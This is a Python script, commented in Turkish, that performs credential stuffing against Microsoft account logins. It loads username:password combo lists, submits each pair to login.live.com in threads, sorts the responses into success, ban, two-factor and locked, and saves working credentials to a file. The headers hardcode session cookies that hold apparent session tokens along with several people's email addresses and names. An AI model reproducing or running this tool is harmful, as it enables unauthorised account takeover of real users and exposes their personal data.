import requests
import threading
import os
from keep_alive import keep_alive
keep_alive()


url = "https://login.live.com/ppsecure/post.srf"
headers = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9,ar;q=0.8",
    "Cache-Control": "max-age=0",
    "Connection": "keep-alive",
    "Content-Type": "application/x-www-form-urlencoded",
    "Host": "login.live.com",
    "Origin": "https://login.live.com",
    "Referer": "https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=23&ct=1712454754&rver=7.0.6738.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fusername%3dozziekurt%2540hotmail.com%26state%3d1%26redirectTo%3daHR0cHM6Ly9vdXRsb29rLmxpdmUuY29tL21haWwvP2FjdFN3dD10cnVl%26RpsCsrfState%3d42590119-648b-fc64-f60f-acc0a568de7d&id=292841&aadredir=0&username=ozziekurt%40hotmail.com&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015&login_hint=ozziekurt%40hotmail.com&actSwt=true",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "sec-ch-ua": '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "Cookie": "MicrosoftApplicationsTelemetryDeviceId=862a3aec-d1f9-4911-aad0-d873ce1135c8; MSFPC=GUID=7ac0038afef14533b1aed8e8a5233f0a&HASH=7ac0&LV=202403&V=4&LU=1710110976841; mkt=en-US; IgnoreCAW=1; MUID=1BF5DC9FAA666C4A26B2C8A1AB1A6DEF; MSPSoftVis=@72198325083833620@:@; MSCC=41.68.223.45-EG; PPLState=1; MSPAuth=Disabled; MSPProf=Disabled; NAP=V=1.9&E=1d43&C=yyibbYTI3q3nG77egxLfY5BA1tQGnyYnyJAZJ6GgXj63XSEJh6ZJBA&W=10; ANON=A=2198000DF86642AF5AC55993FFFFFFFF&E=1d9d&W=10; WLSSC=EgAiAgMAAAAMgAAAFgABbvFHhbpXgCS7eV/uPSBiwbVYs6xvviPi7KVTJIftXhIUnLqT1JyXSR0cWAIY7Uj39vtqGHkw1SOiFX5L7FE9mEBzj3z7sZ1PzMg52WDzsqvwQss79vE4NR6DGfHtP5mIqMw/5UdtWjJspxSK9ehk4wBq3dx4s4KboHtcbRz8ZiLl7daSRk7jDxmJgeO/infwM38HocP7ZQEmmyub8FsW2AqhAnKHF4YsICuaTMIeEoVb4pwsFwuRfLGyuihCY9HLKyjC/20cIlagABOEEfJ7I6eDCz9Sj1YR5vDq6IWdSfEoq9B8m18+qGOhR5A7+9ey1xg4Z08enQwWGXe6dAjxhhEBfgARAQAABgDPwMCpw8IRZo22EWYQJwAAChCgABAZAGFsaWNvX2Jqa19saUBob3RtYWlsLmNvbQBTAAAYYWxpY29fYmprX2xpQGhvdG1haWwuY29tAAAAKVRSAAUwNjkyMACNXhQEHwIAAIEsbUAABEMAA2FsaQAFZHVtYW4E/QAAAAAAAAAAAAAAAAAAAADD31CHhK/yNwAAw8IRZo1diGYAAAAAAAAAAAAAAAANADQxLjY4LjIyMy40NQAFAQAAAAAAAAAAAAAAAAEEAAAAAAAAAAAA3yEHZgAAEJV7zW8wWZgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAAA; JSHP=3$alico_bjk_li%40hotmail.com$ali$duman$$2$0$0$14806592098418634863$0:leomsaito%40hotmail.com$Leonardo$Souza$$2$0$0$14972514575929768440$0:devoyoui%40gmail.com$Abdo$Taha$VfGcFYii$2$0$0$7669023785870795565$0:francescosantamaro%40hotmail.it$Francesco$Santamaro$$2$0$0$5888360164049736130$0:joelmamb29%40hotmail.com$JOELMA$BRITO$LzGyoWkT$2$0$0$6019298452237844641$0; SDIDC=ChLrhkJvQuQsOFTc5fXZz5vwh2FeL6T8YW6HkWIYaLGMWY5JQpj5m3nspbQ19WWcXCZZBtzrlWHnMH!PP9LLcSk87llIPpAvsPEWcA17CVx8x695IvUA7fHgqGIOI981KPqxOPK00zZZhath6r3S5q*!0UUe!ubrzqMSkci6MZD7PU0ePNhGWYvLnB4fccLvrToxnnqu6EIper3f*hoIqSecJmsyHZ54kqagdlJh9c6R4FzCCYeYTAlIbe7JlpWWGh2MKqphSMTSvneV1nezHdAhRZKktEqmac5BTixpx0jtPwMjS1HEzAXnhVdcJIBkGE4CrHgPJ5RjtxDBVhLKuCuSvVQ4P1zyIVzEJyCigLOAtRRLwUX6H9J08hHg6fe4kad4gqfM1FdcWKr5ffVPUk1Ff9LtBfJMv3OZzYA2s42mIgz32R3*7dnqa1jbXo*waET*g7ov1S4HLPUV2nawt2M$; JSH=3$alico_bjk_li%40hotmail.com$ali$duman$$2$0$0$14806592098418634863$0; MSPBack=0; RPSSecAuth=FAB2ARS%2BmCxYUInJtQf7oPRlW4XTRBoEyg5mAAAMgAAAELjDppdF7lIUGF8ygL/cEHAgAW8qKSC06JArJAIszX%2BS926f2nbPD3dKKZ1hjGcP6TtyWPRSfZDcO5F0UnVF9xsyD1zU7hvhHL1MS7E0%2BTctu/7lSm5Hq9o6%2B5/SIgVTgnGLDdml/8tO9L20TRAiJvHLhk2NRQVh4i2OCgXOBuf0%2BqO5o7rKfvLWhyGfDpS1Wy18IbKbfNR/3PGBspSDwZ/H0/OJKNXxzUdpCv4J0yByMseB8qnbpDh3YNV3PFIsYAmwe0j6udU12E5/2OPki/TcFLBQczdAvw%2BpTXj5gkhvprQk%2BpIZSezwQd5RSkc06eF5QCghIWLCjFvOfBwZYNhopjgltW8jhe/lbRRIj%2Bu2yyqs2oAocgRu7ZOjk0/WK%2B4bhxCYUz7gV4ztNg/cZ4iS6yAAWq/ge1YRJbggSvpp5pLagr/E4Mb07ZKJFpOE%2BandCmk%3D; __Host-MSAAUTHP=11-M.C531_BL2.0.U.Cjqu79PBy1V3SdGyhBd*jVpNkqV3ZlpV!zUyT7k0IOYFcaDm6Lckc3o97NDZI1kY52bbiVz1QuEq5XJVUo!M34dsZiNHYl6mQCqjC91RsBxJTxuZUaArusYajGmzRrKdCoG5HFQ*bxZFSc50kKjYM17zxiDR!tlYS4bPD*C6k6TXZlutv1ClUKwF1ylO2U4h6dqj1XhsdnT1*t1alBCJkx19NKd3vBQ4OUwZHhDKRcE0K20aU07XW3vlgP2Rhm6*yseHhcGS7H856t166NVdGTjmxhd7PltS4JMut537m84GHymm6s0eiCb!pc4lGHR6q!kEB3PdyuUBwGH1HaVQChsqKvxDXPAkveqV05aRMvkvtw30xf91xo5!Fx9heGWJhUz686ekJIi8QElLt6SgYf5f6ou7rewdjXHX7bdramhOzP907AR!DOSN16xnA*7KBQn5B8z!PV9a!B!rnezObAvvXHVxCia3TaJUCQp!LBiOMeCUoU2oEOHUirjZ0Ajg4oOo2ZN4XNM3KhnD1XObVOeq6rzWhkP6EAcbQRNfrXNl5aX0bFj3Uw*3nY0zfhEUoUqhXZJRIE13TOWX1EwG6PNoVMqjohC9lyGtMNSNjFPGKcR6ZLqwVU69MIZg2F0tK6hamZBJmD*EUgqRfeI*tODHqeI3BenywN3IPm9MEVdw06gCMpsvbfQjgPIoKk4l9NhXskqSKvIEAa7o6b3kfEdGHxFwqbEISK*cBLwg!T2WNE9hXdxITIluEAg*fA8l0eC*J4In4*And4z*H8tAXL0$; MSPPre=alico_bjk_li%40hotmail.com%7c84aff237c3df5087%7c%7c; MSPCID=84aff237c3df5087; uaid=f54c1530551e4e19bf2c9716320a0d3d; MSPRequ=id=292841&lt=1712454754&co=0; MSPOK=$uuid-1a0dc55f-41cb-4f8d-8d2c-d78da1791ea3; OParams=11O.Dgg5qWCQKuRaQjTeWClbPe0EqSlfgD4LFCaPETiWS5c3TbiTR4LTzc6lArXDL2HMLXPg6o9yXqzQnSYzkHZB*I9ecJAPSMZ7DUPSOS1xz5iS1aNhtgkx*EdXVNxg6DGx8*RsDjfxCRXOyH0r*MWGphi0T6mfrHxFkVNZYTOfvf4T41N0Veuj0eNQ0xlfBjrph3xwJyVSEXiiPCrj8NOYnFbA4o0AP8loqWKSh6fKXrrkKeWPjjuK4EWN2T*gUCMT2E3Niujg7rHkC9ASbHT4ZiiqR5dve17!WfwuETRriENNm1PvRt8cNgOeZvtXHFmnk!hqqd4b!MxpfB2!rmXCV*HUVfrmt6lHied48xW7PVZroSVuRnmwDXpQgbmzHj95cK2815oLXLPgi5ffgN!bM6DLVSE1JcioKjvXFbqyZuyqSekwb52SRWOf139eSVdyO2jo225uzmbZHKpjPzmxWUqi!1GSfvzExG8RN!eicJ8BbGKyvoCfvuI9L7MlgsJYCleKgSMK9Z5bsD63jaZSJRcgkDtJck!f5Q7i8vUjHv!Gr3FPApLhV2rFKDdjb9NL0XCiPE*MGCXOOanYPOBg50goS*340TgUpSGlHO3i3X0NCBgGfwZlS*MUJqSy937OnLf96vLxdugS1K5GVGLOBxAFiPPCXKaWsiyWx3kK0fUFhDeWCk2gRoRr6VhUnOASZ345rzuTHqiyynWzCrH2CcVoJh1g6onzXFP!!B3gs*V4NO29U5wgxMAwcEw2iZKEfZU74Y3hSGP3mnYM1xDjfhTp5JHpe86P0xhsaTuZIRyNIW1SPfKjjeWeO4iG1rcclECQKYayTpgd18OZYtO2ZO3dp5L1wv14VOyLNdyF5VihMW0SvgJwdg7KDMtb4u5q7*fiO7xUBkx67th1XLt6AMTPe39VJVVusVpqhlAtBNr1WCP3OuL*Pg!mAUvtXue*cg$$; ai_session=G36jvrw9a4PHfNcAz96nRT|1712454755514|1712454755514"  # Placeholder for your cookies
}

# Combo dosyasından kullanıcı adı ve parolaları okuma
def load_combos(combo_file):
    with open(combo_file, "r") as f:
        combos = [line.strip().split(":") for line in f if line.strip()]
    return [combo for combo in combos if len(combo) == 2]

# Tek bir giriş denemesi için fonksiyon
def login(username, password):
    payload = {
        "ps": "2",
        "psRNGCDefaultType": "",
        "psRNGCEntropy": "",
        "psRNGCSLK": "",
        "canary": "",
        "ctx": "",
        "hpgrequestid": "",
        "PPFT": "-Dv8FsdYukJTVG33u!rX2gafw8pMc0Hveyxi6M3iuALxhtRtzT1rKMfsId*bk!QqnycgvC3sILE1I8f7OOC53!b1sGqL6CBu3STxzSq2vhOLYmH8aiGacTB3Q7lidVZWvP8OG9RL7Cw2FyrhKVcRv37Z8sTJ*86QlKdV4SmvgwyFNSSZXrVxumisMYvUycOXoErKvBF7lc2QNGKLDbN7m5ngkUfS67XuSQxfotxGq*wZZPMZr6BSPpDErGdbdc3agsw$$",
        "PPSX": "P",
        "NewUser": "1",
        "FoundMSAs": "",
        "fspost": "0",
        "i21": "0",
        "CookieDisclosure": "0",
        "IsFidoSupported": "1",
        "isSignupPost": "0",
        "isRecoveryAttemptPost": "0",
        "i13": "0",
        "login": username,
        "loginfmt": username,
        "type": "11",
        "LoginOptions": "3",
        "lrt": "",
        "lrtPartition": "",
        "hisRegion": "",
        "hisScaleUnit": "",
        "passwd": password
    }

    response = requests.post(url, headers=headers, data=payload)
    return check_response(response, username, password)

# Giriş denemesi sonucunu kontrol eden fonksiyon
def check_response(response, username, password):
    if "Your account or password is incorrect." in response.text or \
       "That Microsoft account doesn\\'t exist. Enter a different account" in response.text or \
       "Sign in to your Microsoft account" in response.text:
        print("Failure: Incorrect account or password.")

    elif ",AC:null,urlFedConvertRename" in response.text or \
         "Too Many Requests" in response.text:
        print("Ban: Too many requests or account converted.")

    elif "timed out" in response.text:
        print("Failure: Request timed out.")

    elif "https://logincdn.msftauth.net/" in response.text or \
         "/cancel?mkt=" in response.text:
        print("Success: Login successful.")
        with open("successful_logins.txt", "a") as f:
            f.write(f"{username}:{password}\n")

    elif "account.live.com/recover?mkt" in response.text or \
         "recover?mkt" in response.text or \
         "account.live.com/identity/confirm?mkt" in response.text or \
         "Email/Confirm?mkt" in response.text:
        print("2FACTOR: Two-factor authentication required.")

    elif "/Abuse?mkt=" in response.text:
        print("Account locked.")

# Thread oluşturma ve başlatma
def start_threads(combo_file, num_threads):
    combos = load_combos(combo_file)
    threads = []

    for username, password in combos:
        thread = threading.Thread(target=login, args=(username, password))
        threads.append(thread)
        if len(threads) >= num_threads:
            for t in threads:
                t.start()
            for t in threads:
                t.join()
            threads = []

    for t in threads:
        t.start()
    for t in threads:
        t.join()

# Combo dosyası adı ve thread sayısı
combo_file = "combo.txt"
num_threads = 2

start_threads(combo_file, num_threads)
